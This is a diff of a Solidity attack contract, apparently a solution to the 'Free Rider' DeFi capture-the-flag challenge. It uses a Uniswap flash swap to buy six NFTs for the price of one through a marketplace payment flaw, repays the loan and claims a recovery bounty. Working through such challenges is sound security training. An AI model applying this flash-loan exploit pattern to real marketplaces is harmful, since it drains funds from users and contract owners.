@@ -34,9 +34,9 @@ contract FreeRiderAttack {
     }
 
     function attack() external payable {
-        // 1. Request a flashSwap of 15 WETH from Uniswap Pair
-        bytes memory data = abi.encode(NFT_PRICE);
-        pair.swap(NFT_PRICE, 0, address(this), data);
+        // Request a flashSwap of 15 WETH from Uniswap Pair
+        // NOTE passing "0x" as the data to trigger the flash swap
+        pair.swap(NFT_PRICE, 0, address(this), "0x");
     }
 
     function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
@@ -45,20 +45,26 @@ contract FreeRiderAttack {
         require(msg.sender == address(pair));
         require(tx.origin == player);
 
-        // 2. Unwrap WETH to native ETH
+        // Unwrap WETH to native ETH
         weth.withdraw(NFT_PRICE);
 
-        // 3. Buy 6 NFTS for only 15 ETH total
+        // Buy 6 NFTS for only 15 ETH total
         marketplace.buyMany{value: NFT_PRICE}(tokens);
 
-        // 4. Pay back 15WETH + 0.3% to the pair contract
-        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000;
+        // Pay back 15WETH + 0.3% to the pair contract
+        // 15044999999999998000 (15.045 ETH)
+        uint256 amountToPayBack = NFT_PRICE * 1004 / 1000; 
         weth.deposit{value: amountToPayBack}();
         weth.transfer(address(pair), amountToPayBack);
 
-        // 5. Send NFTs to recovery contract so we can get the bounty
+        // Send NFTs to recovery contract so we can get the bounty
         bytes memory data = abi.encode(player);
         for(uint256 i; i < tokens.length; i++){
+            /* NOTE triggers onERC721Received on the recovery contract
+             so the data in this case must be the enceded player address
+             since in the recovery contract onERC721Received function this data
+             is decoded and used to send the bounty to it!
+            */
             nft.safeTransferFrom(address(this), recoveryContract, i, data);
         }
         
